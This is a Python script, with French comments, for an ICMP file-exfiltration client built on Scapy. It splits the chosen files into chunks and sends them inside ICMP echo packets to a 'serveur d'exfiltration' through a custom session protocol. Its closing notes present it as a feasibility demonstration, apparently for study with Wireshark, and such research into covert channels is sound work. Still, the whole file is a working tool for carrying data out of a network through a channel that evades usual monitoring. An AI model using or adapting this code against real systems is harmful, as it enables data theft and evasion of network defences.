from scapy.all import IP, ICMP, send, conf
import argparse, os, random
from ipaddress import ip_address
from proto import MiniProto

# Scapy en mode silencieux (évite le bruit dans la sortie standard)

conf.verb = 0

# Vérifie qu'un fichier existe et sois lisable.
def valid_file(path: str) -> str:
    if not os.path.exists(path):
        raise argparse.ArgumentTypeError(f"File '{path}' does not exist.")
    if not os.path.isfile(path):
        raise argparse.ArgumentTypeError(f"'{path}' is not a file.")
    if not os.access(path, os.R_OK):
        raise argparse.ArgumentTypeError(f"File '{path}' is not readable.")

    return path

parser = argparse.ArgumentParser(description="ICMP exfiltration client (MiniProto).")
parser.add_argument("-d", "--destination", type=ip_address,required=True, help="Adresse IP du serveur d'exfiltration")
parser.add_argument("-f", "--files", nargs='+',type=valid_file,required=True, help="Chemins des fichiers à exfiltrer")

args = parser.parse_args()

target = args.destination
proto = MiniProto()
sess_id = random.randint(1, 0xffff)
PACKET_BASE = IP(dst=target.__str__())/ICMP()

# Ouvre la session côté serveur
send(PACKET_BASE/(proto.build_nw_session(sess_id)))

# --- Transfert de chaque fichier ---------------------------------------------
for file in args.files:
    file_id = random.randint(1, 0xffff)
    filename_str = os.path.basename(file)
    # NEW_FILE : annonce le fichier (session, file_id, nom)
    packet = PACKET_BASE/(proto.build_nw_file(sess_id, file_id, os.path.basename(file).encode()))
    send(packet)
    # SEND_DATA : segmentation et envoi bloc par bloc (taille adaptée à la MTU)
    for data in proto.build_sfd_file(sess_id, file_id, file):
        packet  = PACKET_BASE/data
        send(packet)
    # EOF : fin de transfert pour ce fichier
    packet = PACKET_BASE/proto.build_eof(sess_id, file_id)
    send(packet)

# CLOSE_SESSION : clôture propre de la session
send(PACKET_BASE/(proto.build_close_session(sess_id)))

# Notes rapides :
# - Fiabilité : pas d’ACK/NACK ni de retransmission; objectif : démontrer la faisabilité.
# - Sécurité : pas de chiffrement/authentification;  utile pour rendre la capture Wireshark lisible.
# - Réseau  : nécessite "CAP_NET_RAW" pour émettre des Echo personnalisés.